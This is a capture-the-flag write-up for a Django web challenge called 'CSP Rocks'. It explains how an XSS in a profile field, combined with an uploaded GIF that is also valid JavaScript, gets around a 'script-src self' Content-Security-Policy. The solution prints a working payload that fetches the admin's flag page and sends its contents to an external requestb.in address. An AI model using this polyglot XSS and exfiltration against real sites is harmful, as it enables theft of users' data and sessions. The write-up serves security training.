# CSP Rocks
**Category:** Web
**Points:** 200
**Keyword:** xss, csp, httponly

**Description:**
> Find a way to trick admin to visit flag page for you. Don't worry he's checking all of user's 
profile pages each 30 seconds.

**Challenge hints:**
- Check page errors,
- Admin is not using chrome or firefox. 
- Sometimes it's better to trick someone to stole from it. 3- 

**Technologies used:**
Django + PhantomJS + Selenium + Supervisor

## Config
```
virtualenv2 venv
source venv/bin/activate
pip install -r requirements.txt
```

And run this commands as a service with supervisor:
```
python manage.py check_profiles
```


## Solution
First register and login with your credentials.

There is a comment in first page about "csp", that leads to a hint for users to know that this site is protected with csp
Checking index page with burpsuite will give use below response headers:
```
HTTP/1.0 200 OK
Date: Sun, 21 Jan 2018 05:35:36 GMT
Server: WSGIServer/0.1 Python/2.7.13
Vary: Cookie
X-Frame-Options: SAMEORIGIN
Content-Type: text/html; charset=utf-8
Content-Length: 3618
Content-Security-Policy: script-src 'self'; style-src 'self'; default-src 'all'; img-src 'self'; connect-src 'self'; font-src 'self'
```
Also there is another hint in "index" page. An image about django is provided in the page,
But is not rendered cause of csp violations.
```
Content Security Policy: The page’s settings blocked the loading of a resource at http://www.unixstickers.com/image/cache/data/stickers/django/django.sh-600x600.png (“img-src http://localhost:8001”).
```

Surfing around the website, There is not much things to do. except the edit profile section that seem
to be vulnerable. But what we can do about it!

There is a xss vulnerability in description field, But there is a limitation about 80 characters. 
So we can't perform big interesting attacks unless we import our payload from external source.
But as we know csp doesn't allow us to do this so. Cause of "script-src: self" rule.

There is also a image upload section. Maybe we can use that for our attack. But there is limitation
on upload of only images with content-type of png,jpg,gif and jpeg.

**Final payloads:**
Create a gif file with below content:
```
GIF89a/*.......�/=0;var xhr = new XMLHttpRequest();
xhr.open('GET', '/flag');
xhr.onload = function() {
    if (xhr.status === 200) {
        var arr = xhr.responseText.match(/<h3 id="flag">([\w\W\t\s]*)<\/h3>/gi) || [""];
        document.location = 'https://requestb.in/15iwn8z1?text=' + arr;
    }
};
xhr.send()
```
Add code below to description:
```
<script src="http://localhost:8001/media/avatar/test_lV0APfy.gif"></script>
```
Remember to put the location of your image in src section.

After a while admin will visit your page and flag will be send to you...

## References

- http://devalias.net/devalias/2016/09/16/ctf-snippets-xss-gif/
- https://blackpentesters.blogspot.com.au/2013/08/gif-image-xss.html
- https://github.com/0xdevalias/devalias.net/blob/master/_posts/2016-09-16-ctf-snippets-xss-gif.md



***Peace out - execut3***